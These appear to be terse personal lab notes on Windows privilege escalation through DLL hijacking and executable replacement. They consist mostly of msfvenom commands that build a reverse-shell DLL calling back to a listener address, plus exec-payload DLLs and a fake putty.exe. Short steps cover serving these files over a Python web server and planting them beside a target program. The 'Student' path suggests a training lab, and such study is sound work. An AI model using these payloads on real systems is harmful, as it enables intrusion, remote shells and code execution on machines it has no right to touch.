msfvenom -p windows/shell_reverse_tcp LHOST=10.50.24.130 LPORT=10000 -f dll > WINMM.dll #wrong
msfvenom -p windows/exec CMD="cmd.exe /C whoami > C:\\Users\\Student\\whoami.txt" -f dll > SSPICLI.dll

python3 -m http.server
windows browser(lin_IP:8000)
download it from there and put it in the same folder as the executable

EXECUTABLE REPLACEMENT:
rename executable means you can do this

msfvenom -p windows/exec CMD="cmd.exe /C whoami > C:\\Users\\Student\\whoami.txt" -f exe > putty.exe #name the executable to the one you're trying to replace

scp or python3 -m http.server to get it onto the device
